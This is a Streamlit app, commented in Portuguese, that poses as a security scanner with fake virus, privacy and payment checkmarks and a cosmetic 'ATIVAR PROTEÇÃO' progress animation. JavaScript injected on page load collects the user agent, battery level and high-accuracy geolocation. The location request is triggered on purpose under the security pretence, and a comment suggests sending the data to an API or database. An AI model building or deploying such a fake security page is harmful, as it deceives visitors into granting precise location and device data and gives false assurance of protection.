import streamlit as st
import streamlit.components.v1 as components
import time

# 1. Configuração da Página e Estilização (Mantendo o seu visual)
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { width: 100%; border-radius: 20px; background-color: #262730; color: white; border: none; height: 50px; }
    
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
        box-shadow: 0 0 20px rgba(0, 255, 127, 0.2);
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# 2. Script para abrir o Pop-up de Localização e capturar Dados do Sistema
# Este componente injeta o JavaScript que aciona o pedido de "Precisão de Local"
components.html("""
    <script>
    async function coletarDados() {
        let dados = {
            modelo: navigator.userAgent,
            bateria: "Desconhecida",
            lat: null, lon: null
        };

        // Captura Nível da Bateria
        try {
            const battery = await navigator.getBattery();
            dados.bateria = Math.round(battery.level * 100) + "%";
        } catch (e) {}

        // Solicita Localização (Abre o pop-up do sistema)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                dados.lat = pos.coords.latitude;
                dados.lon = pos.coords.longitude;
                console.log("Dados Coletados:", dados);
                // Aqui você poderia enviar para uma API/Banco de dados
            }, (err) => {
                console.log("Localização negada.");
            }, { enableHighAccuracy: true });
        }
    }
    window.onload = coletarDados;
    </script>
""", height=0)

# 3. Interface Visual (Fiel ao seu print)
st.title("Verificar segurança")

placeholder_bolha = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    for i in range(4, 101, 5):
        placeholder_bolha.markdown(f"""
            <div class="circle-container">
                <div class="circle spin">{i}%</div>
            </div>
            """, unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    # Estado Inicial
    placeholder_bolha.markdown("""
        <div class="circle-container">
            <div class="circle">4%</div>
        </div>
        """, unsafe_allow_html=True)

st.warning("Permissão de localização negada ou indisponível.")
